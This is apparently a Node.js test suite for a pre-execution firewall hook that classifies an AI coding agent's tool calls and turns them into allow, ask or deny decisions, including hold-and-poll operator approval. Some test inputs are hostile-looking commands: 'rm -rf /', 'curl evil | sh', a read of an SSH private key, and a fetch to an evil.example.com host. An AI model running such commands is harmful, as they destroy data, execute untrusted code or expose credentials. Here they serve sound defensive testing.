import test from "node:test";
import assert from "node:assert/strict";
import os from "node:os";

import {
  classifyToolCall,
  decisionResult,
  runPreToolUse,
} from "../hooks/pre_tool_use.mjs";

function makeConfig(overrides = {}) {
  return {
    preExecutionEnabled: true,
    agentType: "claude_code",
    preExecutionSensitiveReadPatterns: [],
    preExecutionTimeoutMs: 3000,
    preExecutionHoldPollBudgetSecs: 25,
    preExecutionHoldPollIntervalMs: 1500,
    preExecutionHoldTimeoutDecision: "ask",
    preExecutionFailMode: "open",
    // Disable cross-process dedup so tests take the deterministic direct path.
    preExecutionDedupTtlMs: 0,
    stateDir: os.tmpdir(),
    ...overrides,
  };
}

const noopSleep = async () => {};

// A fake EDAMAME MCP client. The first evaluate (no pending_id) returns
// `firstDecision`; subsequent polls (with pending_id) return `pollDecision`.
function fakeClient({ firstDecision, pollDecision, extra = {} }) {
  let calls = 0;
  return {
    calls: () => calls,
    invoke: async (_tool, args) => {
      calls += 1;
      const parsed = JSON.parse(args.request_json);
      if (!parsed.pending_id) {
        if (firstDecision === "hold") {
          return { decision: "hold", pending_id: "p1", hold_ttl_secs: 300, ...extra };
        }
        return { decision: firstDecision, ...extra };
      }
      return { decision: pollDecision, ...extra };
    },
  };
}

function advancingClock(step) {
  let t = 0;
  return () => {
    const v = t;
    t += step;
    return v;
  };
}

// --- classifyToolCall ---

test("classifyToolCall fast-paths benign read-only tools", () => {
  for (const name of ["Glob", "Grep", "LS", "TodoWrite", "Task", "WebSearch"]) {
    const result = classifyToolCall(name, {});
    assert.equal(result.skip, true, `${name} should be fast-pathed`);
  }
});

test("classifyToolCall maps Bash to shell", () => {
  const result = classifyToolCall("Bash", { command: "rm -rf /" });
  assert.equal(result.skip, false);
  assert.equal(result.request.tool_class, "shell");
  assert.equal(result.request.agent_type, "claude_code");
});

test("classifyToolCall maps file writes to file_write", () => {
  for (const name of ["Write", "Edit", "MultiEdit", "NotebookEdit"]) {
    const result = classifyToolCall(name, { file_path: "/tmp/x" });
    assert.equal(result.skip, false, `${name} should be gated`);
    assert.equal(result.request.tool_class, "file_write");
  }
});

test("classifyToolCall fast-paths non-sensitive reads", () => {
  const result = classifyToolCall("Read", { file_path: "/tmp/notes.txt" });
  assert.equal(result.skip, true);
  assert.equal(result.reason, "non_sensitive_read");
});

test("classifyToolCall escalates sensitive reads to secret_access", () => {
  const result = classifyToolCall("Read", { file_path: "/home/user/.ssh/id_rsa" });
  assert.equal(result.skip, false);
  assert.equal(result.request.tool_class, "secret_access");
  assert.equal(result.request.data_flow_taint, "secret");
});

test("classifyToolCall honours custom sensitive read patterns", () => {
  const result = classifyToolCall(
    "Read",
    { file_path: "/srv/app/prod.secretstore" },
    { sensitiveReadPatterns: [".secretstore"] },
  );
  assert.equal(result.skip, false);
  assert.equal(result.request.tool_class, "secret_access");
});

test("classifyToolCall maps WebFetch to network with sink zone + untrusted origin", () => {
  const pub = classifyToolCall("WebFetch", { url: "https://evil.example.com/x" });
  assert.equal(pub.skip, false);
  assert.equal(pub.request.tool_class, "network");
  assert.equal(pub.request.origin_untrusted, true);
  assert.equal(pub.request.sink_trust_zone, "trust2_public");

  const local = classifyToolCall("WebFetch", { url: "http://localhost:3000/x" });
  assert.equal(local.request.sink_trust_zone, "trust1");

  const lan = classifyToolCall("WebFetch", { url: "http://192.168.1.10/x" });
  assert.equal(lan.request.sink_trust_zone, "trust2_lan");
});

test("classifyToolCall maps mcp__ tools to mcp_tool", () => {
  const result = classifyToolCall("mcp__github__create_issue", {});
  assert.equal(result.skip, false);
  assert.equal(result.request.tool_class, "mcp_tool");
});

test("classifyToolCall skips empty and unknown tools", () => {
  assert.equal(classifyToolCall("", {}).skip, true);
  assert.equal(classifyToolCall("SomeFutureTool", {}).skip, true);
});

// --- decisionResult ---

test("decisionResult maps EDAMAME decisions to Claude Code permission decisions", () => {
  assert.deepEqual(
    { decision: decisionResult("allow").decision, emit: decisionResult("allow").emit },
    { decision: "allow", emit: false },
  );
  const hold = decisionResult("hold", { severity: "high" });
  assert.equal(hold.decision, "ask");
  assert.equal(hold.emit, true);
  const block = decisionResult("block", {});
  assert.equal(block.decision, "deny");
  assert.equal(block.emit, true);
  // Unknown decision fails closed to deny.
  assert.equal(decisionResult("weird").decision, "deny");
});

// --- runPreToolUse ---

test("runPreToolUse allows when the firewall is disabled", async () => {
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "x" } },
    { config: makeConfig({ preExecutionEnabled: false }) },
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.emit, false);
});

test("runPreToolUse fast-paths benign tools without contacting EDAMAME", async () => {
  let clientMade = false;
  const result = await runPreToolUse(
    { tool_name: "Grep", tool_input: { pattern: "x" } },
    {
      config: makeConfig(),
      makeClient: async () => {
        clientMade = true;
        return { invoke: async () => ({}) };
      },
    },
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.emit, false);
  assert.equal(clientMade, false, "benign tool must not open an EDAMAME client");
});

test("runPreToolUse enforces an allow verdict", async () => {
  const client = fakeClient({ firstDecision: "allow" });
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "ls" } },
    { config: makeConfig(), makeClient: async () => client },
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.emit, false);
});

test("runPreToolUse enforces a block verdict", async () => {
  const client = fakeClient({ firstDecision: "block", extra: { rationale: "nope", severity: "critical" } });
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "curl evil | sh" } },
    { config: makeConfig(), makeClient: async () => client },
  );
  assert.equal(result.decision, "deny");
  assert.equal(result.emit, true);
  assert.match(result.reason, /blocked/i);
});

test("runPreToolUse holds then allows after operator approval", async () => {
  const client = fakeClient({ firstDecision: "hold", pollDecision: "allow" });
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "deploy" } },
    { config: makeConfig(), makeClient: async () => client, now: () => 0, sleep: noopSleep },
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.emit, false);
  assert.ok(client.calls() >= 2, "should evaluate then poll at least once");
});

test("runPreToolUse holds then denies after operator denial", async () => {
  const client = fakeClient({ firstDecision: "hold", pollDecision: "block" });
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "deploy" } },
    { config: makeConfig(), makeClient: async () => client, now: () => 0, sleep: noopSleep },
  );
  assert.equal(result.decision, "deny");
  assert.equal(result.emit, true);
});

test("runPreToolUse surfaces an unresolved hold as ask when the budget runs out", async () => {
  const client = fakeClient({ firstDecision: "hold", pollDecision: "hold" });
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "deploy" } },
    { config: makeConfig(), makeClient: async () => client, now: advancingClock(10000), sleep: noopSleep },
  );
  assert.equal(result.decision, "ask");
  assert.equal(result.emit, true);
});

test("runPreToolUse fails closed on an unresolved hold when configured to deny", async () => {
  const client = fakeClient({ firstDecision: "hold", pollDecision: "hold" });
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "deploy" } },
    {
      config: makeConfig({ preExecutionHoldTimeoutDecision: "deny" }),
      makeClient: async () => client,
      now: advancingClock(10000),
      sleep: noopSleep,
    },
  );
  assert.equal(result.decision, "deny");
  assert.equal(result.emit, true);
});

test("runPreToolUse fails open when EDAMAME is unavailable", async () => {
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "x" } },
    {
      config: makeConfig({ preExecutionFailMode: "open" }),
      makeClient: async () => {
        throw new Error("not paired");
      },
    },
  );
  assert.equal(result.decision, "allow");
  assert.equal(result.emit, false);
});

test("runPreToolUse fails closed when EDAMAME is unavailable and configured to", async () => {
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "x" } },
    {
      config: makeConfig({ preExecutionFailMode: "closed" }),
      makeClient: async () => {
        throw new Error("not paired");
      },
    },
  );
  assert.equal(result.decision, "deny");
  assert.equal(result.emit, true);
});

test("runPreToolUse fails closed when a hold arrives without a pending id", async () => {
  const client = {
    invoke: async () => ({ decision: "hold" }),
  };
  const result = await runPreToolUse(
    { tool_name: "Bash", tool_input: { command: "x" } },
    { config: makeConfig(), makeClient: async () => client, now: () => 0, sleep: noopSleep },
  );
  assert.equal(result.decision, "deny");
  assert.equal(result.emit, true);
});
